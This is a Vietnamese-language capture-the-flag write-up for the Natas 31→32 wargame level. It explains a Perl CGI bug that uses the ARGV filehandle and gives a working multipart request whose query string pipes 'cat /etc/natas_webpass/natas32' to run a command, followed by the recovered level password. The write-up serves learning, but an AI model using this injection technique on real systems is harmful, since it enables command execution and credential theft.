# Natas 31 → 32

## Mục tiêu

Dùng Perl diamond operator để đọc password Natas 32.

## Tôi thấy

Source CSV2HTML kiểm tra `upload('file')`, sau đó lấy `$cgi->param('file')` làm đối số cho `while (<$file>)`. CGI cho phép gửi nhiều trường cùng tên. Perl special filehandle `ARGV` đọc các đối số dòng lệnh; khi query string được diễn giải thành đối số Perl, pipe có thể thực thi lệnh.

## Cách làm

Gửi hai trường multipart `file`: trường đầu là `ARGV`, trường thứ hai là một CSV hợp lệ. Thêm lệnh đọc password vào query string:

```text
POST /index.pl?cat%20/etc/natas_webpass/natas32%20%7C
Content-Type: multipart/form-data

file=ARGV
file=@test.csv
```

CSV dùng trong lần xác minh:

```csv
name,value
probe,123
```

Response đưa password Natas 32 vào ô đầu của bảng.

## Vì sao cách này hiệu quả

`param('file')` chọn giá trị đầu tiên (`ARGV`) trong khi `upload('file')` thấy file upload thứ hai. Diamond operator `<$file>` với `ARGV` đọc danh sách đối số của Perl, trong đó query string đưa pipe command vào luồng đọc.

## Kết quả

Response trả `Rc3837d6qd3KoW0R2IgKssMXRX06btgY`. Đã xác thực Basic Auth thành công tại Natas 32.

